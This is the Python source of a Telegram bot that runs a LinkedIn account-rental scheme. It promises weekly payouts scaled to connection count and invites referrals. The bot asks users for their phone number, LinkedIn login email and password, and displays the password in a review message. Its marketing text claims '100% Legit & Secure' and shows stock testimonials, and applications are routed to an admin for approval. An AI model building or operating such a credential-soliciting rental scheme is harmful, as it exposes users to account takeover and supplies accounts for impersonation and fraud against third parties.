import logging
import sqlite3
from functools import wraps
from telegram import (
    InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, Update, ParseMode
)
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, Filters, CallbackContext
)
from telegram.error import BadRequest
from datetime import datetime
import os
from dotenv import load_dotenv
from flask import Flask, request
from telegram import Bot
from telegram.ext import Dispatcher

load_dotenv()

# ------------------------- SUPABASE INITIALIZATION -------------------------
from supabase import create_client, Client
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

def test_supabase_connection():
    try:
        response = supabase.table('applications').select('*').limit(1).execute()
        print('Supabase connection successful:', response.data)
    except Exception as e:
        print('Supabase connection failed:', e)

# ------------------------- CONFIGURATION -------------------------

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DB_PATH = 'applications.db'

# Replace with your admin's numeric chat id (retrieved via /getid command)
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID'))

# ------------------------- CONVERSATION STATES -------------------------

(
    HOME, 
    RENT_LINKEDIN_EXIST, 
    RENT_CONNECTIONS, 
    RENT_EARNING_CONFIRM,
    RENT_PHONE, 
    RENT_LINKEDIN, 
    RENT_PASSWORD, 
    APPLICATION_REVIEW,
    HELP_SCREEN, 
    CONTACT_ADMIN,
    TESTIMONIALS, 
    RECEIVE_TESTIMONIAL, 
    REFERRAL, 
    INVITE_FRIEND,
    AWAITING_USER_ID,
    AWAITING_MESSAGE,
    ADMIN_MESSAGE_INPUT,
    AWAITING_ADMIN_MESSAGE
) = range(18)

EARNING_MAPPING = {
    '>100': 7,
    '>200': 10,
    '>300': 12.5,
    '>400': 15,
    '>500': 17.5,
    '>600': 20,
    '700-1000': 25,
}

# Add to conversation states
USER_LIST_PAGE = range(18, 19)[0]  # Add this at the end of state definitions

USERS_PER_PAGE = 5  # Number of users to display per page

# ------------------------- DATABASE FUNCTIONS -------------------------

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS applications (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER,
                    full_name TEXT,
                    phone TEXT,
                    linkedin_account TEXT,
                    password TEXT,
                    connections TEXT,
                    weekly_earning REAL,
                    status TEXT DEFAULT 'pending'
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER,
                    referral_code TEXT,
                    invited_count INTEGER DEFAULT 0
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS conversations (
                    user_id INTEGER PRIMARY KEY,
                    admin_id INTEGER,
                    last_contact DATETIME DEFAULT CURRENT_TIMESTAMP
                 )''')  
    conn.commit()
    conn.close()

def save_application(data: dict):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO applications (
                    telegram_id, full_name, phone, linkedin_account,
                    password, connections, weekly_earning, status
                 ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (
                  data.get('telegram_id'),
                  data.get('full_name'),
                  data.get('phone'),
                  data.get('linkedin_account'),
                  data.get('password'),
                  data.get('connections'),
                  data.get('weekly_earning'),
                  'pending'
              ))
    conn.commit()
    conn.close()
    


# ***********************************************************
def update_application_status(telegram_id: int, new_status: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        UPDATE applications
        SET status = ?
        WHERE telegram_id = ?
        AND id = (
            SELECT MAX(id)
            FROM applications
            WHERE telegram_id = ?
        )
    ''', (new_status, telegram_id, telegram_id))
    conn.commit()
    conn.close()

def get_application_status(telegram_id: int) -> str:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        SELECT status
        FROM applications
        WHERE telegram_id = ?
        ORDER BY id DESC
        LIMIT 1
    ''', (telegram_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None



# Add new database function
def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        SELECT DISTINCT telegram_id, full_name 
        FROM applications
        ORDER BY id DESC  -- Newest first (correct SQL comment syntax)
    ''')
    users = c.fetchall()
    conn.close()
    return users




# ------------------------- HELPER FUNCTIONS -------------------------

from telegram import ParseMode

def safe_edit_caption(query, text, reply_markup=None):
    """
    Tries to edit either text or caption, always using Markdown parsing,
    so your **bold** and *italic* will render correctly.
    """
    try:
        if query.message.text:  # If it's a text message
            query.edit_message_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.message.caption:  # If it's a media message with a caption
            query.edit_message_caption(
                caption=text,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            # fallback or log warning
            print("⚠️ Message has neither text nor caption.")
    except Exception as e:
        print(f"❌ Failed to edit message: {e}")



def go_home(update: Update, context: CallbackContext) -> int:
    return main_menu(update, context)

# Temporary command to get chat id for admin
def get_id(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    update.message.reply_text(f"Your chat id is: {chat_id}")

# ------------------------- HANDLER FUNCTIONS -------------------------

def start(update: Update, context: CallbackContext) -> int:
    user = update.effective_user
    context.user_data['full_name'] = user.first_name
    status = get_application_status(user.id)
    status_text = f"\n\nYour current application status: \n {status.capitalize()}" if status else "\n\nYou have no active applications."
    caption = (f"Hello {user.first_name}, welcome to LINKEDIN ACCOUNT RENTERS.\n\n"
               "Your LinkedIn account == Your Personal ATM! 🏧\n\n"
               "@linkedIn_BussinessET lets you rent out your LinkedIn account for legitimate business and networking, "
               "and we pay you generously for access. It's simple, safe, and profitable!\n\n"
               "------------------------------------" + status_text)
    keyboard = [
        [InlineKeyboardButton("Rent", callback_data="rent"),
         InlineKeyboardButton("Help", callback_data="help")],
        [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
         InlineKeyboardButton("Referral", callback_data="referral")]
    ]
    with open("./assets/Linked Banner.jpg", "rb") as banner:
        photo_message = context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=banner,
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    context.user_data['menu_message_id'] = photo_message.message_id
    return HOME


def main_menu(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    query.delete_message()
    user_id = update.effective_user.id
    status = get_application_status(user_id)
    status_text = f"\n\nYour current application status: {status.capitalize()}" if status else "\n\nYou have no active applications."
    caption = (f"Welcome back to LINKEDIN ACCOUNT RENTERS!\n\n"
               "Your LinkedIn account == Your Personal ATM! 🏧\n\n"
               "@linkedIn_BussinessET lets you rent out your LinkedIn account for legitimate business and networking, "
               "and we pay you generously for access. It's simple, safe, and profitable!\n\n"
               "------------------------------------" + status_text)
    keyboard = [
        [InlineKeyboardButton("Rent", callback_data="rent"),
         InlineKeyboardButton("Help", callback_data="help")],
        [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
         InlineKeyboardButton("Referral", callback_data="referral")]
    ]
    with open("./assets/Linked Banner.jpg", "rb") as banner:
        photo_message = context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=banner,
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    context.user_data['menu_message_id'] = photo_message.message_id
    return HOME
# *************************************

def admin_approve_reject(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    data = query.data
    action, user_id = data.split('_', 1)
    user_id = int(user_id)

    if action == 'approve':
        new_status = 'accepted ✅'
        status_text = "✅ Approved"
    elif action == 'reject':
        new_status = 'rejected ❌'
        status_text = "❌ Rejected"
    else:
        return

    update_application_status(user_id, new_status)

    try:
        context.bot.send_message(
            chat_id=user_id,
            text=f"Your application has been {new_status}!"
        )
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")

    try:
        original_text = query.message.text
        
        # Preserve both status and message button
        new_keyboard = [
            [
                InlineKeyboardButton(status_text, callback_data="status"),
                InlineKeyboardButton("💬 Send Message", callback_data=f"message_{user_id}")
            ]
        ]
        
        query.edit_message_text(
            text=original_text,
            reply_markup=InlineKeyboardMarkup(new_keyboard)
        )
    except BadRequest as e:
        logger.error(f"Failed to edit message: {e}")

    return

def get_users_page(users, page):
    start = page * USERS_PER_PAGE
    end = start + USERS_PER_PAGE
    return users[start:end]


# Add admin message handlers
def list_users(update: Update, context: CallbackContext, page=0):
    """Show paginated user list with inline buttons"""
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    
    users = get_all_users()
    if not users:
        update.message.reply_text("No users found in database.")
        return
    
    total_pages = (len(users) + USERS_PER_PAGE - 1) // USERS_PER_PAGE
    page_users = get_users_page(users, page)
    
    # Create buttons for users
    buttons = [
        [InlineKeyboardButton(
            f"👤 {user[1]} (ID: {user[0]})", 
            callback_data=f"select_user_{user[0]}"
        )] 
        for user in page_users
    ]
    
    # Create navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"user_page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"user_page_{page+1}"))
    
    if nav_buttons:
        buttons.append(nav_buttons)
    
    reply_markup = InlineKeyboardMarkup(buttons)
    
    text = f"📄 User List (Page {page+1}/{total_pages})\n\nSelect a user to message:"
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        update.message.reply_text(text, reply_markup=reply_markup)
    
    return USER_LIST_PAGE

def handle_user_pagination(update: Update, context: CallbackContext):
    """Handle pagination buttons"""
    query = update.callback_query
    query.answer()
    
    _, _, page = query.data.split('_')
    list_users(update, context, page=int(page))
    return USER_LIST_PAGE

def handle_user_selection(update: Update, context: CallbackContext):
    """Handle user selection from list"""
    query = update.callback_query
    query.answer()
    
    parts = query.data.split('_')
    user_id = int(parts[2])  # Format: select_user_123
    context.user_data['target_user'] = user_id
    
    query.edit_message_text(f"✉️ Enter message for user {user_id}:")
    return AWAITING_ADMIN_MESSAGE  # Make sure this matches the state name


def start_message_flow(update: Update, context: CallbackContext):
    """Initiate admin messaging flow"""
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    
    update.message.reply_text(
        "Please enter the user ID you want to message:",
        reply_markup=ReplyKeyboardRemove()
    )
    return AWAITING_USER_ID

def receive_user_id(update: Update, context: CallbackContext):
    """Capture target user ID"""
    try:
        user_id = int(update.message.text)
        context.user_data['target_user'] = user_id
        update.message.reply_text("Now enter your message:")
        return AWAITING_MESSAGE
    except ValueError:
        update.message.reply_text("Invalid user ID. Please enter a numeric ID:")
        return AWAITING_USER_ID

def send_user_message(update: Update, context: CallbackContext):
    """Send message to target user"""
    target_user = context.user_data.get('target_user')
    message = update.message.text

    # Track conversation in database
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO conversations 
        (user_id, admin_id) 
        VALUES (?, ?)
    ''', (target_user, ADMIN_CHAT_ID))
    conn.commit()
    conn.close()

    try:
        # Ensure target_user is integer
        context.bot.send_message(
            chat_id=int(target_user),
            text=f"📨 Message from admin:\n\n{message}"
        )
        update.message.reply_text(
            f"✅ Message sent to user {target_user}!",
            reply_markup=ReplyKeyboardRemove()
        )
    except Exception as e:
        logger.error(f"Failed to send message to {target_user}: {e}")
        update.message.reply_text(
            f"❌ Failed to send message: {str(e)}",
            reply_markup=ReplyKeyboardRemove()
        )
    
    context.user_data.clear()
    return ConversationHandler.END


def handle_admin_message_request(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    
    if str(update.effective_user.id) != str(ADMIN_CHAT_ID):
        return
    
    _, user_id = query.data.split('_', 1)
    context.user_data['target_user'] = user_id
    
    # Keep original message buttons intact
    update.effective_message.reply_text(
        f"💬 Enter your message for user {user_id}:",
        reply_markup=ReplyKeyboardRemove()
    )
    
    return ADMIN_MESSAGE_INPUT

def handle_admin_message_input(update: Update, context: CallbackContext):
    logger.info(f"Attempting to send message to: {context.user_data.get('target_user')}")
    message_text = update.message.text
    target_user = context.user_data.get('target_user')
    
    try:
        # Ensure target_user is integer
        context.bot.send_message(
            chat_id=int(target_user),  # Explicit conversion
            text=f"📨 Message from admin:\n\n{message_text}"
        )
        update.message.reply_text(
            f"✅ Message sent to user {target_user}!",
            reply_markup=ReplyKeyboardRemove()
        )
    except Exception as e:
        logger.error(f"Failed to send message to {target_user}: {e}")
        update.message.reply_text(
            f"❌ Failed to send message: {str(e)}",
            reply_markup=ReplyKeyboardRemove()
        )
    
    context.user_data.clear()
    return ConversationHandler.END


def cancel_admin_message(update: Update, context: CallbackContext):
    update.message.reply_text("Message cancelled.", reply_markup=ReplyKeyboardRemove())
    context.user_data.clear()
    return ConversationHandler.END




# Add new handler for user replies
def handle_user_reply(update: Update, context: CallbackContext):
    if update.message.reply_to_message:
        original_message = update.message.reply_to_message.text
        if "📨 Message from admin:" in original_message:
            # Forward reply to admin
            context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"📩 Reply from user {update.effective_user.id} ({update.effective_user.first_name}):\n\n{update.message.text}"
            )
            update.message.reply_text("✅ Your reply has been sent to the admin!")



def handle_user_message(update: Update, context: CallbackContext):
    """Handle unsolicited user messages"""
    user_id = update.effective_user.id
    message = update.message.text
    
    # Check if user has existing conversation
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT admin_id FROM conversations WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        admin_id = result[0]
        context.bot.send_message(
            chat_id=admin_id,
            text=f"📩 New message from user {user_id}:\n\n{message}"
        )
        update.message.reply_text("✅ Your message has been forwarded to the admin!")
    else:
        update.message.reply_text("ℹ️ Please use the menu options to interact with the bot.")



def copy_link_handler(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    referral_link = (
        f"https://t.me/{context.bot.username}"
        f"?start={update.effective_user.id}"
    )
    # Send the referral link as a message to the user for easy copying
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"🔗 Here’s your referral link:\n{referral_link}\n\nYou can copy it directly from here!"
    )
    query.answer()  # Acknowledge the callback query
    # return state if you're in a ConversationHandler
    return INVITE_FRIEND

# ------------------------- RENT FLOW -------------------------

def rent_entry(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    text = "Do you have a LinkedIn account?"
    keyboard = [
        [InlineKeyboardButton("Yes", callback_data="rent_yes"),
         InlineKeyboardButton("No", callback_data="rent_no")],
        [InlineKeyboardButton("Go Back", callback_data="home")]
    ]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return RENT_LINKEDIN_EXIST

def rent_linkedin_response(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    if query.data == "rent_no":
        safe_edit_caption(query, "You need a LinkedIn account to apply. Returning to Home.")
        return go_home(update, context)
    else:
        text = "How many connections does your LinkedIn account have?"
        keyboard = [
            [InlineKeyboardButton("< 100", callback_data="<100"),
             InlineKeyboardButton(">100", callback_data=">100")],
            [InlineKeyboardButton(">200", callback_data=">200"),
             InlineKeyboardButton(">300", callback_data=">300")],
            [InlineKeyboardButton(">400", callback_data=">400"),
             InlineKeyboardButton(">500", callback_data=">500")],
            [InlineKeyboardButton(">600", callback_data=">600"),
             InlineKeyboardButton("700-1000", callback_data="700-1000")],
            [InlineKeyboardButton("Go Back", callback_data="home")]
        ]
        safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
        return RENT_CONNECTIONS

def rent_connections_response(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    connections = query.data
    context.user_data['connections'] = connections

    if connections == "<100":
        safe_edit_caption(query, "You are not eligible to apply with less than 100 connections. Returning to Home.")
        return go_home(update, context)
    elif connections in EARNING_MAPPING:
        weekly_earning = EARNING_MAPPING[connections]
        context.user_data['weekly_earning'] = weekly_earning
        text = (
            f"📊 *Earnings Estimation*\n\n"
            f"👥 *Connections:* {connections}\n\n"
            f"💸 *Estimated Weekly Earnings:* `${weekly_earning}`\n\n"
            f"Would you like to proceed with the application?"
        )
        keyboard = [
            [InlineKeyboardButton("Yes", callback_data="proceed_yes"),
             InlineKeyboardButton("No", callback_data="proceed_no")]
        ]
        safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
        return RENT_EARNING_CONFIRM
    else:
        safe_edit_caption(query, "Unexpected option. Returning to Home.")
        return go_home(update, context)

def rent_earning_confirm(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    if query.data == "proceed_no":
        safe_edit_caption(query, "Application cancelled. Returning to Home.")
        return go_home(update, context)
    else:
        text = "Please share your phone number:"
        keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("Share Phone", request_contact=True)]],
            one_time_keyboard=True, resize_keyboard=True
        )
        safe_edit_caption(query, text)
        update.effective_message.reply_text(text, reply_markup=keyboard)
        return RENT_PHONE

def rent_received_phone(update: Update, context: CallbackContext) -> int:
    if update.message.contact:
        contact = update.message.contact.phone_number
    else:
        contact = update.message.text
    context.user_data['phone'] = contact
    update.message.reply_text("Phone number received.", reply_markup=ReplyKeyboardRemove())
    update.message.reply_text("Please enter your Login Email:")
    return RENT_LINKEDIN

def rent_received_linkedin(update: Update, context: CallbackContext) -> int:
    linkedin_account = update.message.text
    context.user_data['linkedin_account'] = linkedin_account
    update.message.reply_text("Got it. Now, please enter your Login Password:")
    return RENT_PASSWORD

def rent_received_password(update: Update, context: CallbackContext) -> int:
    password = update.message.text
    context.user_data['password'] = password

    # Show review of all collected information.
    review_text = (
        "📝 *Please review your application:*\n\n"
        f"👤 *Name:* `{context.user_data.get('full_name')}`\n\n"
        f"📞 *Phone:* `{context.user_data.get('phone')}`\n\n"
        f"📧 *Email:* `{context.user_data.get('linkedin_account')}`\n\n"
        f"🔐 *Password:* `{context.user_data.get('password')}`\n\n"
        f"🤝 *Connections:* `{context.user_data.get('connections')}`\n\n"
        f"💵 *Potential Weekly Earnings:* `${context.user_data.get('weekly_earning')}`\n\n"
        "✅ *Is the above information correct?*"
    )

    keyboard = [
        [InlineKeyboardButton("Submit Application", callback_data="submit_app")],
        [InlineKeyboardButton("🔙 Go Back", callback_data="home")]
    ]

    update.message.reply_text(
        review_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

    return APPLICATION_REVIEW


def submit_application(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()

    # Collect application data
    application_data = {
        'telegram_id': str(update.effective_user.id),
        'full_name': context.user_data.get('full_name', ''),
        'phone': context.user_data.get('phone'),
        'linkedin_account': context.user_data.get('linkedin_account'),
        # 'password' removed for security reasons
        'connections': context.user_data.get('connections'),
        'weekly_earning': context.user_data.get('weekly_earning'),
        'submitted_at': datetime.now().isoformat()
    }
    save_application(application_data)

    # Prepare message with application details
    application_message = (
        f"📥 *New Application Received:*\n\n"
        f"👤 *Name:* {application_data['full_name']}\n\n"
        f"📞 *Phone:* {application_data['phone']}\n\n"
        f"🔗 *LinkedIn:* {application_data['linkedin_account']}\n\n"
        f"🤝 *Connections:* {application_data['connections']}\n\n"
        f"💰 *Potential Earnings:* ${application_data['weekly_earning']} / week"
    )

    # Inline buttons for admin actions
    keyboard = [
        [
            InlineKeyboardButton("Approve", callback_data=f"approve_{application_data['telegram_id']}"),
            InlineKeyboardButton("Reject", callback_data=f"reject_{application_data['telegram_id']}")
        ],
        [InlineKeyboardButton("💬 Send Message", callback_data=f"message_{application_data['telegram_id']}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the message to the admin with the application details and action buttons
    context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=application_message,
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

    # Notify the user that their application has been submitted
    safe_edit_caption(query, "✅ Your application has been submitted!\nStatus: ⏳ Pending")

    # Optional confirmation message after submission
    query.message.reply_text("✅ Your application is successfully submitted! Thank you.")

    return go_home(update, context)

# ------------------------- HELP FLOW -------------------------

def help_screen(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    text = (
        "💸 Weekly Earnings Based on Connections 💸\n\n"
        "💰 100+ ➤ $7/week\n\n"
        "💰 200+ ➤ $10/week\n\n"
        "💰 300+ ➤ $12.5/week\n\n"
        "💰 400+ ➤ $15/week\n\n"
        "💰 500+ ➤ $17.5/week\n\n"
        "💰 600+ ➤ $20/week\n\n"
        "💰 700-1000+ ➤ $25/week\n\n"
        "✅ 100% Legit & Secure\n\n"
        "📅 Weekly Payouts\n\n"
        "💳 Flexible Payment Options\n\n"
        "💬 Questions? Contact our admin."
    )

    keyboard = [
        [InlineKeyboardButton("Go Back", callback_data="home"),
         InlineKeyboardButton("Contact Admin", callback_data="contact_admin")]
    ]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return HELP_SCREEN

def contact_admin(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    text = f"Please contact our admin at: @ukcryptohodlers\n\n For any inquiries or assistance, feel free to reach out."
    keyboard = [[InlineKeyboardButton("Go Back", callback_data="home")]]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return HELP_SCREEN

# ------------------------- TESTIMONIALS FLOW -------------------------

def testimonials(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    text = (
        "🌟 **What People Are Saying** 🌟\n\n"
        "🗣️ *“This service transformed my LinkedIn experience!”*\n— **Yoni A**\n\n"
        "🗣️ *“Fast payment and reliable service.”*\n— **Meron**\n\n"
        "🗣️ *“I referred my friends and earned a bonus too!”*\n— **Henok**"
    )
    keyboard = [
        [
            InlineKeyboardButton("🔙 Go Back", callback_data="home"),
            InlineKeyboardButton("✍️ Testify", callback_data="testify")
        ]
    ]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return TESTIMONIALS




def receive_testimonial(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    safe_edit_caption(query, "Please send your testimonial text:")
    return RECEIVE_TESTIMONIAL

def store_testimonial(update: Update, context: CallbackContext) -> int:
    testimonial = update.message.text
    
    # Send testimonial to admin
    try:
        context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"New testimonial received:\n\n{testimonial}"
        )
    except Exception as e:
        logger.error(f"Failed to send testimonial to admin: {e}")
    
    # Send confirmation to user
    update.message.reply_text("Thank you for your testimonial!")
    
    # Return to main menu properly
    keyboard = [
        [InlineKeyboardButton("Rent", callback_data="rent"),
         InlineKeyboardButton("Help", callback_data="help")],
        [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
         InlineKeyboardButton("Referral", callback_data="referral")]
    ]
    return start(update, context)
    
    return HOME

# ------------------------- REFERRAL FLOW -------------------------

def referral(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()
    text = (
        "🎁 **Referral Program** 🎁\n\n"
        "👥 You've invited **0** friends so far.\n"
        "🚀 Invite more to unlock **exclusive bonuses & weekly cash rewards**!\n\n"
        "🔗 Share your referral link and start earning!"
    )
    keyboard = [
        [
            InlineKeyboardButton("🔙 Go Back", callback_data="home"),
            InlineKeyboardButton("📨 Invite a Friend", callback_data="invite")
        ]
    ]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return REFERRAL

def invite_friend(update: Update, context: CallbackContext) -> int:
    query = update.callback_query

    # 1) If they tapped “Copy Link,” we immediately answer with an alert:
    if query.data == "copy_link":
        referral_link = f"https://t.me/{context.bot.username}?start={update.effective_user.id}"
        query.answer(
            text=f"🔗 Referral Link:\n{referral_link}",
            show_alert=True
        )
        return INVITE_FRIEND

    # 2) Otherwise, show the main invite panel:
    query.answer()
    referral_link = f"https://t.me/{context.bot.username}?start={update.effective_user.id}"
    text = (
        "🎉 **Invite Friends & Earn!** 🎉\n\n"
        "Share this link and unlock exclusive bonuses:\n\n"
        f"```\n{referral_link}\n```"
    )
    keyboard = [
        [ InlineKeyboardButton(
            "📲 Share with Friends",
            url=(
                "https://t.me/share/url?"
                "&text=Join me on start earning, Turn your LinkedIn to Money!!\n"
                f"url={referral_link}"
            )
        ) ],
        [ InlineKeyboardButton("🔗 Copy Link", callback_data="copy_link") ],
        [ InlineKeyboardButton("🔙 Go Back", callback_data="home") ],
    ]
    safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
    return INVITE_FRIEND


# ------------------------- MAIN FUNCTION -------------------------

def main():
    # Use Flask for webhook
    app = Flask(__name__)
    TOKEN = os.getenv('BOT_TOKEN') or os.getenv('TELEGRAM_BOT_TOKEN')
    WEBHOOK_URL = os.environ["WEBHOOK_URL"]
    PORT = int(os.environ.get("PORT", 8443))

    bot = Bot(token=TOKEN)
    dispatcher = Dispatcher(bot, None, workers=4, use_context=True)

    # Register handlers (same as before, but use dispatcher)
    dispatcher.add_handler(CommandHandler('users', list_users, filters=Filters.user(user_id=ADMIN_CHAT_ID)))
    admin_msg_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_admin_message_request, pattern=r'^message_\\d+$')],
        states={
            ADMIN_MESSAGE_INPUT: [MessageHandler(Filters.text & ~Filters.command, handle_admin_message_input)]
        },
        fallbacks=[CommandHandler('cancel', cancel_admin_message)],
        allow_reentry=True
    )
    dispatcher.add_handler(admin_msg_handler)
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            HOME: [
                CallbackQueryHandler(main_menu, pattern="^home$"),
                CallbackQueryHandler(rent_entry, pattern="^rent$"),
                CallbackQueryHandler(help_screen, pattern="^help$"),
                CallbackQueryHandler(testimonials, pattern="^testimonials$"),
                CallbackQueryHandler(referral, pattern="^referral$")
            ],
            RENT_LINKEDIN_EXIST: [
                CallbackQueryHandler(rent_linkedin_response, pattern="^(rent_yes|rent_no)$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            RENT_CONNECTIONS: [
                CallbackQueryHandler(rent_connections_response, pattern="^(<100|>100|>200|>300|>400|>500|>600|700-1000)$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            RENT_EARNING_CONFIRM: [
                CallbackQueryHandler(rent_earning_confirm, pattern="^(proceed_yes|proceed_no)$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            RENT_PHONE: [
                MessageHandler(Filters.contact | Filters.text, rent_received_phone)
            ],
            RENT_LINKEDIN: [
                MessageHandler(Filters.text, rent_received_linkedin)
            ],
            RENT_PASSWORD: [
                MessageHandler(Filters.text, rent_received_password)
            ],
            APPLICATION_REVIEW: [
                CallbackQueryHandler(submit_application, pattern="^submit_app$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            HELP_SCREEN: [
                CallbackQueryHandler(contact_admin, pattern="^contact_admin$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            TESTIMONIALS: [
                CallbackQueryHandler(receive_testimonial, pattern="^testify$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            RECEIVE_TESTIMONIAL: [
                MessageHandler(Filters.text, store_testimonial)
            ],
            REFERRAL: [
                CallbackQueryHandler(invite_friend, pattern="^invite$"),
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            INVITE_FRIEND: [
                CallbackQueryHandler(main_menu, pattern="^home$")
            ],
            AWAITING_ADMIN_MESSAGE: [
                MessageHandler(Filters.text & ~Filters.command, handle_admin_message_input)
            ],
            
            USER_LIST_PAGE: [
                CallbackQueryHandler(handle_user_pagination, pattern=r'^user_page_\\d+$'),
                CallbackQueryHandler(handle_user_selection, pattern=r'^select_user_\\d+$')
            ]
        },
        fallbacks=[CommandHandler("cancel", go_home)],
        allow_reentry=True
    )
    dispatcher.add_handler(conv_handler)
    dispatcher.add_handler(CommandHandler("getid", get_id))
    dispatcher.add_handler(CallbackQueryHandler(admin_approve_reject, pattern=r'^(approve|reject)_\\d+$'))
    dispatcher.add_handler(CallbackQueryHandler(handle_user_pagination, pattern=r'^user_page_\\d+$'))
    dispatcher.add_handler(CallbackQueryHandler(handle_user_selection, pattern=r'^select_user_\\d+$'))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_user_reply))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_user_message))
    dispatcher.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link$"))
    dispatcher.add_handler(CallbackQueryHandler(invite_friend, pattern="^invite_friend$"))
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler('users', 
        lambda u, c: list_users(u, c, page=0), 
        filters=Filters.user(user_id=ADMIN_CHAT_ID)))
    # ...existing code for updating conv_handler.states...

    # Set webhook
    bot.delete_webhook()
    bot.set_webhook(url=WEBHOOK_URL)

    @app.route("/", methods=["GET", "HEAD"])
    def home():
        return "Am alive!!!", 200


    @app.route("/webhook", methods=["POST"])
    def webhook():
        if request.method == "POST":
            update = Update.de_json(request.get_json(force=True), bot)
            dispatcher.process_update(update)
        return "ok"

    app.run(host="0.0.0.0", port=PORT)

if __name__ == '__main__':
    init_db()
    main()
